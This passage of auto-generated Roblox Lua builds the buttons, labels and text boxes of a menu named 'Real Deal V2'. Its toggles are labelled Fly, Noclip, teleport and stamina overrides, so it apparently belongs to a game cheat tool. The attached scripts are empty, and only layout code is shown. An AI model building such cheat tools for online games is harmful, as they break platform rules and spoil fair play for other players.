G2L["91"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["91"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["91"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["91"]["BackgroundTransparency"] = 1;
G2L["91"]["RichText"] = true;
G2L["91"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["91"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["91"]["Text"] = [[Auto 1x1x1x1 Popups]];
G2L["91"]["Name"] = [[Auto one egg's popup LMA0]];
G2L["91"]["Position"] = UDim2.new(0.001, 0, 0.499, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Auto one egg's popup LMA0.ImageButton
G2L["92"] = Instance.new("ImageButton", G2L["91"]);
G2L["92"]["BorderSizePixel"] = 0;
G2L["92"]["BackgroundTransparency"] = 1;
G2L["92"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["92"]["Image"] = [[rbxassetid://76864339841735]];
G2L["92"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["92"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["92"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["92"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Auto one egg's popup LMA0.ImageButton.LocalScript
G2L["93"] = Instance.new("LocalScript", G2L["92"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Auto one egg's popup LMA0.ImageButton.UICorner
G2L["94"] = Instance.new("UICorner", G2L["92"]);
G2L["94"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun
G2L["95"] = Instance.new("Frame", G2L["6b"]);
G2L["95"]["Visible"] = false;
G2L["95"]["BorderSizePixel"] = 0;
G2L["95"]["BackgroundColor3"] = Color3.fromRGB(28, 138, 148);
G2L["95"]["Size"] = UDim2.new(0.99982, 0, 0.85028, 0);
G2L["95"]["Position"] = UDim2.new(0, 0, 0.08711, 0);
G2L["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["95"]["Name"] = [[Fun]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Fly
G2L["96"] = Instance.new("TextLabel", G2L["95"]);
G2L["96"]["TextWrapped"] = true;
G2L["96"]["BorderSizePixel"] = 0;
G2L["96"]["TextSize"] = 36;
G2L["96"]["TextScaled"] = true;
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["96"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["96"]["BackgroundTransparency"] = 1;
G2L["96"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["96"]["Text"] = [[Fly]];
G2L["96"]["Name"] = [[Fly]];
G2L["96"]["Position"] = UDim2.new(0.49556, 0, 0.03541, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Fly.ImageButton
G2L["97"] = Instance.new("ImageButton", G2L["96"]);
G2L["97"]["BorderSizePixel"] = 0;
G2L["97"]["BackgroundTransparency"] = 1;
G2L["97"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["97"]["Image"] = [[rbxassetid://76864339841735]];
G2L["97"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["97"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["97"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["97"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Fly.ImageButton.LocalScript
G2L["98"] = Instance.new("LocalScript", G2L["97"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Fly.ImageButton.UICorner
G2L["99"] = Instance.new("UICorner", G2L["97"]);
G2L["99"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.PlayerTpUICreate
G2L["9a"] = Instance.new("TextLabel", G2L["95"]);
G2L["9a"]["TextWrapped"] = true;
G2L["9a"]["BorderSizePixel"] = 0;
G2L["9a"]["TextSize"] = 31;
G2L["9a"]["TextScaled"] = true;
G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9a"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9a"]["BackgroundTransparency"] = 1;
G2L["9a"]["RichText"] = true;
G2L["9a"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["9a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9a"]["Text"] = [[TpUi?]];
G2L["9a"]["Name"] = [[PlayerTpUICreate]];
G2L["9a"]["Position"] = UDim2.new(0.01532, 0, 0.03707, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.PlayerTpUICreate.ImageButton
G2L["9b"] = Instance.new("ImageButton", G2L["9a"]);
G2L["9b"]["BorderSizePixel"] = 0;
G2L["9b"]["BackgroundTransparency"] = 1;
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9b"]["Image"] = [[rbxassetid://76864339841735]];
G2L["9b"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["9b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9b"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["9b"]:SetAttribute([[toggle]], [[]]);
G2L["9b"]:SetAttribute([[exitted]], false);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.PlayerTpUICreate.ImageButton.LocalScript
G2L["9c"] = Instance.new("LocalScript", G2L["9b"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.PlayerTpUICreate.ImageButton.UICorner
G2L["9d"] = Instance.new("UICorner", G2L["9b"]);
G2L["9d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.HAKARI(Best Emote BTW)
G2L["9e"] = Instance.new("TextLabel", G2L["95"]);
G2L["9e"]["TextWrapped"] = true;
G2L["9e"]["BorderSizePixel"] = 0;
G2L["9e"]["TextSize"] = 24;
G2L["9e"]["TextScaled"] = true;
G2L["9e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9e"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9e"]["BackgroundTransparency"] = 1;
G2L["9e"]["RichText"] = true;
G2L["9e"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["9e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9e"]["Text"] = [[HAKARI]];
G2L["9e"]["Name"] = [[HAKARI(Best Emote BTW)]];
G2L["9e"]["Position"] = UDim2.new(-0.00201, 0, 0.52361, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.HAKARI(Best Emote BTW).ImageButton
G2L["9f"] = Instance.new("ImageButton", G2L["9e"]);
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["BackgroundTransparency"] = 1;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9f"]["Image"] = [[rbxassetid://76864339841735]];
G2L["9f"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["9f"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.HAKARI(Best Emote BTW).ImageButton.LocalScript
G2L["a0"] = Instance.new("LocalScript", G2L["9f"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.HAKARI(Best Emote BTW).ImageButton.UICorner
G2L["a1"] = Instance.new("UICorner", G2L["9f"]);
G2L["a1"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Noclip
G2L["a2"] = Instance.new("TextLabel", G2L["95"]);
G2L["a2"]["TextWrapped"] = true;
G2L["a2"]["BorderSizePixel"] = 0;
G2L["a2"]["TextSize"] = 24;
G2L["a2"]["TextScaled"] = true;
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a2"]["BackgroundTransparency"] = 1;
G2L["a2"]["RichText"] = true;
G2L["a2"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a2"]["Text"] = [[NOCLIP]];
G2L["a2"]["Name"] = [[Noclip]];
G2L["a2"]["Position"] = UDim2.new(0.49799, 0, 0.26324, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Noclip.ImageButton
G2L["a3"] = Instance.new("ImageButton", G2L["a2"]);
G2L["a3"]["BorderSizePixel"] = 0;
G2L["a3"]["BackgroundTransparency"] = 1;
G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a3"]["Image"] = [[rbxassetid://76864339841735]];
G2L["a3"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a3"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["a3"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Noclip.ImageButton.LocalScript
G2L["a4"] = Instance.new("LocalScript", G2L["a3"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Noclip.ImageButton.UICorner
G2L["a5"] = Instance.new("UICorner", G2L["a3"]);
G2L["a5"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.FpsCounter
G2L["a6"] = Instance.new("TextLabel", G2L["95"]);
G2L["a6"]["TextWrapped"] = true;
G2L["a6"]["BorderSizePixel"] = 0;
G2L["a6"]["TextSize"] = 24;
G2L["a6"]["TextScaled"] = true;
G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a6"]["BackgroundTransparency"] = 1;
G2L["a6"]["RichText"] = true;
G2L["a6"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a6"]["Text"] = [[FPS Counter]];
G2L["a6"]["Name"] = [[FpsCounter]];
G2L["a6"]["Position"] = UDim2.new(0.02335, 0, 0.2657, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.FpsCounter.ImageButton
G2L["a7"] = Instance.new("ImageButton", G2L["a6"]);
G2L["a7"]["BorderSizePixel"] = 0;
G2L["a7"]["BackgroundTransparency"] = 1;
G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a7"]["Image"] = [[rbxassetid://76864339841735]];
G2L["a7"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a7"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["a7"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.FpsCounter.ImageButton.LocalScript
G2L["a8"] = Instance.new("LocalScript", G2L["a7"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.FpsCounter.ImageButton.UICorner
G2L["a9"] = Instance.new("UICorner", G2L["a7"]);
G2L["a9"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Satisfying Click
G2L["aa"] = Instance.new("TextLabel", G2L["95"]);
G2L["aa"]["TextWrapped"] = true;
G2L["aa"]["BorderSizePixel"] = 0;
G2L["aa"]["TextSize"] = 31;
G2L["aa"]["TextScaled"] = true;
G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["aa"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["aa"]["BackgroundTransparency"] = 1;
G2L["aa"]["RichText"] = true;
G2L["aa"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["aa"]["Text"] = [[SATISFYING CLICK]];
G2L["aa"]["Name"] = [[Satisfying Click]];
G2L["aa"]["Position"] = UDim2.new(0.48212, 0, 0.52298, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Satisfying Click.ImageButton
G2L["ab"] = Instance.new("ImageButton", G2L["aa"]);
G2L["ab"]["BorderSizePixel"] = 0;
G2L["ab"]["BackgroundTransparency"] = 1;
G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ab"]["Image"] = [[rbxassetid://76864339841735]];
G2L["ab"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ab"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["ab"]:SetAttribute([[toggle]], [[]]);
G2L["ab"]:SetAttribute([[exitted]], false);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Satisfying Click.ImageButton.LocalScript
G2L["ac"] = Instance.new("LocalScript", G2L["ab"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Satisfying Click.ImageButton.UICorner
G2L["ad"] = Instance.new("UICorner", G2L["ab"]);
G2L["ad"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.No Camera Zoom Limit
G2L["ae"] = Instance.new("TextLabel", G2L["95"]);
G2L["ae"]["TextWrapped"] = true;
G2L["ae"]["BorderSizePixel"] = 0;
G2L["ae"]["TextSize"] = 31;
G2L["ae"]["TextScaled"] = true;
G2L["ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ae"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ae"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ae"]["BackgroundTransparency"] = 1;
G2L["ae"]["RichText"] = true;
G2L["ae"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ae"]["Text"] = [[Toggle Camera Zoom Limit]];
G2L["ae"]["Name"] = [[No Camera Zoom Limit]];
G2L["ae"]["Position"] = UDim2.new(-0.00196, 0, 0.7697, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.No Camera Zoom Limit.ImageButton
G2L["af"] = Instance.new("ImageButton", G2L["ae"]);
G2L["af"]["BorderSizePixel"] = 0;
G2L["af"]["BackgroundTransparency"] = 1;
G2L["af"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["af"]["Image"] = [[rbxassetid://76864339841735]];
G2L["af"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["af"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["af"]:SetAttribute([[toggle]], [[]]);
G2L["af"]:SetAttribute([[exitted]], false);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.No Camera Zoom Limit.ImageButton.LocalScript
G2L["b0"] = Instance.new("LocalScript", G2L["af"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.No Camera Zoom Limit.ImageButton.UICorner
G2L["b1"] = Instance.new("UICorner", G2L["af"]);
G2L["b1"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Exit
G2L["b2"] = Instance.new("TextLabel", G2L["95"]);
G2L["b2"]["TextWrapped"] = true;
G2L["b2"]["BorderSizePixel"] = 0;
G2L["b2"]["TextSize"] = 18;
G2L["b2"]["TextScaled"] = true;
G2L["b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b2"]["BackgroundTransparency"] = 1;
G2L["b2"]["RichText"] = true;
G2L["b2"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b2"]["Text"] = [[Exit?]];
G2L["b2"]["Name"] = [[Exit]];
G2L["b2"]["Position"] = UDim2.new(0.49332, 0, 0.76967, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Exit.ImageButton
G2L["b3"] = Instance.new("ImageButton", G2L["b2"]);
G2L["b3"]["BorderSizePixel"] = 0;
G2L["b3"]["BackgroundTransparency"] = 1;
G2L["b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b3"]["Image"] = [[rbxassetid://76864339841735]];
G2L["b3"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b3"]["Position"] = UDim2.new(0.23064, 0, 0.85373, 0);
-- Attributes
G2L["b3"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Exit.ImageButton.LocalScript
G2L["b4"] = Instance.new("LocalScript", G2L["b3"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Exit.ImageButton.UICorner
G2L["b5"] = Instance.new("UICorner", G2L["b3"]);
G2L["b5"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina
G2L["b6"] = Instance.new("Frame", G2L["6b"]);
G2L["b6"]["Visible"] = false;
G2L["b6"]["BorderSizePixel"] = 0;
G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(28, 138, 148);
G2L["b6"]["Size"] = UDim2.new(0.99982, 0, 0.85028, 0);
G2L["b6"]["Position"] = UDim2.new(0, 0, 0.08711, 0);
G2L["b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b6"]["Name"] = [[Stamina]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MinStamina
G2L["b7"] = Instance.new("TextLabel", G2L["b6"]);
G2L["b7"]["TextWrapped"] = true;
G2L["b7"]["BorderSizePixel"] = 0;
G2L["b7"]["TextSize"] = 24;
G2L["b7"]["TextScaled"] = true;
G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["BackgroundTransparency"] = 1;
G2L["b7"]["RichText"] = true;
G2L["b7"]["Size"] = UDim2.new(0.42722, 0, 0.123, 0);
G2L["b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["Text"] = [[Set Min Stamina]];
G2L["b7"]["Name"] = [[MinStamina]];
G2L["b7"]["Position"] = UDim2.new(0.552, 0, 0.02999, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MinStamina.TextButton
G2L["b8"] = Instance.new("TextButton", G2L["b7"]);
G2L["b8"]["TextWrapped"] = true;
G2L["b8"]["BorderSizePixel"] = 0;
G2L["b8"]["TextSize"] = 99;
G2L["b8"]["TextScaled"] = true;
G2L["b8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b8"]["BackgroundColor3"] = Color3.fromRGB(96, 96, 96);
G2L["b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b8"]["Size"] = UDim2.new(0.49352, 0, 0.67058, 0);
G2L["b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b8"]["Text"] = [[Press Me After]];
G2L["b8"]["Position"] = UDim2.new(0.25719, 0, 1.89341, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MinStamina.TextButton.LocalScript
G2L["b9"] = Instance.new("LocalScript", G2L["b8"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MinStamina.TextButton.UICorner
G2L["ba"] = Instance.new("UICorner", G2L["b8"]);
G2L["ba"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MinStamina.TextButton.UIStroke
G2L["bb"] = Instance.new("UIStroke", G2L["b8"]);
G2L["bb"]["Thickness"] = 3.3;
G2L["bb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MinStamina.TextBox
G2L["bc"] = Instance.new("TextBox", G2L["b7"]);
G2L["bc"]["BorderSizePixel"] = 0;
G2L["bc"]["TextWrapped"] = true;
G2L["bc"]["TextSize"] = 14;
G2L["bc"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bc"]["TextScaled"] = true;
G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["bc"]["Size"] = UDim2.new(1.07374, 0, 0.69031, 0);
G2L["bc"]["Position"] = UDim2.new(-0.02668, 0, 1, 0);
G2L["bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bc"]["Text"] = [[Default 0]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MinStamina.TextBox.UICorner
G2L["bd"] = Instance.new("UICorner", G2L["bc"]);
G2L["bd"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MinStamina.TextBox.UIStroke
G2L["be"] = Instance.new("UIStroke", G2L["bc"]);
G2L["be"]["Thickness"] = 3.3;
G2L["be"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaGain
G2L["bf"] = Instance.new("TextLabel", G2L["b6"]);
G2L["bf"]["TextWrapped"] = true;
G2L["bf"]["BorderSizePixel"] = 0;
G2L["bf"]["TextSize"] = 24;
G2L["bf"]["TextScaled"] = true;
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bf"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["BackgroundTransparency"] = 1;
G2L["bf"]["RichText"] = true;
G2L["bf"]["Size"] = UDim2.new(0.42722, 0, 0.123, 0);
G2L["bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["Text"] = [[Set Stamina Gain]];
G2L["bf"]["Name"] = [[StaminaGain]];
G2L["bf"]["Position"] = UDim2.new(0.53967, 0, 0.40124, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaGain.TextButton
G2L["c0"] = Instance.new("TextButton", G2L["bf"]);
G2L["c0"]["TextWrapped"] = true;
G2L["c0"]["BorderSizePixel"] = 0;
G2L["c0"]["TextSize"] = 99;
G2L["c0"]["TextScaled"] = true;
G2L["c0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c0"]["BackgroundColor3"] = Color3.fromRGB(96, 96, 96);
G2L["c0"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c0"]["Size"] = UDim2.new(0.49352, 0, 0.67058, 0);
G2L["c0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c0"]["Text"] = [[Press Me After]];
G2L["c0"]["Position"] = UDim2.new(0.25719, 0, 1.89341, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaGain.TextButton.LocalScript
G2L["c1"] = Instance.new("LocalScript", G2L["c0"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaGain.TextButton.UICorner
G2L["c2"] = Instance.new("UICorner", G2L["c0"]);
G2L["c2"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaGain.TextButton.UIStroke
G2L["c3"] = Instance.new("UIStroke", G2L["c0"]);
G2L["c3"]["Thickness"] = 3.3;
G2L["c3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaGain.TextBox
G2L["c4"] = Instance.new("TextBox", G2L["bf"]);
G2L["c4"]["BorderSizePixel"] = 0;
G2L["c4"]["TextWrapped"] = true;
G2L["c4"]["TextSize"] = 14;
G2L["c4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c4"]["TextScaled"] = true;
G2L["c4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c4"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c4"]["Size"] = UDim2.new(1.07374, 0, 0.69031, 0);
G2L["c4"]["Position"] = UDim2.new(-0.02668, 0, 1, 0);
G2L["c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c4"]["Text"] = [[Default 20]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaGain.TextBox.UICorner
G2L["c5"] = Instance.new("UICorner", G2L["c4"]);
G2L["c5"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaGain.TextBox.UIStroke
G2L["c6"] = Instance.new("UIStroke", G2L["c4"]);
G2L["c6"]["Thickness"] = 3.3;
G2L["c6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaLoss
G2L["c7"] = Instance.new("TextLabel", G2L["b6"]);
G2L["c7"]["TextWrapped"] = true;
G2L["c7"]["BorderSizePixel"] = 0;
G2L["c7"]["TextSize"] = 24;
G2L["c7"]["TextScaled"] = true;
G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c7"]["BackgroundTransparency"] = 1;
G2L["c7"]["RichText"] = true;
G2L["c7"]["Size"] = UDim2.new(0.42722, 0, 0.123, 0);
G2L["c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c7"]["Text"] = [[Set Stamina loss]];
G2L["c7"]["Name"] = [[StaminaLoss]];
G2L["c7"]["Position"] = UDim2.new(0.01698, 0, 0.4015, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaLoss.TextButton
G2L["c8"] = Instance.new("TextButton", G2L["c7"]);
G2L["c8"]["TextWrapped"] = true;
G2L["c8"]["BorderSizePixel"] = 0;
G2L["c8"]["TextSize"] = 99;
G2L["c8"]["TextScaled"] = true;
G2L["c8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c8"]["BackgroundColor3"] = Color3.fromRGB(96, 96, 96);
G2L["c8"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c8"]["Size"] = UDim2.new(0.49352, 0, 0.67058, 0);
G2L["c8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c8"]["Text"] = [[Press Me After]];
